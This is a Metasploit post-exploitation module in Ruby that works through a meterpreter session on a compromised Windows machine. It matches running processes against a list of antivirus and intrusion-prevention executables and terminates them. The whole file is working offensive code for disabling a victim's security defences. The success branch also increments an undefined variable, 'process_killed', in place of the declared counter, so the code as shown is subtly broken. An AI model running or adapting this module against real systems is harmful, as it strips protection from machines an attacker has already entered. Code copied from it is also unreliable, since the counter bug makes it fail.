##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'set'

class Metasploit4 < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Windows Post Kill Antivirus and Hips',
      'Description'  => %q{
        This module attempts to locate and terminate any processes that are identified
        as being Antivirus or Host-based IPS related.
      },
      'License'      => MSF_LICENSE,
      'Author'       => [
        'Marc-Andre Meloche (MadmanTM)',
        'Nikhil Mittal (Samratashok)',
        'Jerome Athias'
      ],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))
  end

  def run
    avs = ::File.read(::File.join(Msf::Config.data_directory, 'wordlists',
                                  'av_hips_executables.txt')).strip
    avs = Set.new(avs.split("\n"))

    processes_found = 0
    processes_killed = 0
    client.sys.process.get_processes().each do |x|
      vprint_status("Checking #{x['name'].downcase} ...")
      if avs.include?(x['name'].downcase)
        processes_found += 1
        print_status("Attempting to terminate '#{x['name']}' (PID: #{x['pid']}) ...")
        begin
          client.sys.process.kill(x['pid'])
          process_killed += 1
          print_good("#{x['name']} terminated.")
        rescue Rex::Post::Meterpreter::RequestError
          print_error("Failed to terminate '#{x['name']}' (PID: #{x['pid']}).")
        end
      end
    end

    if processes_found == 0
      print_status('No target processes were found.')
    else
      print_good("A total of #{processes_found} process(es) were discovered, #{processes_killed} were terminated.")
    end
  end

end
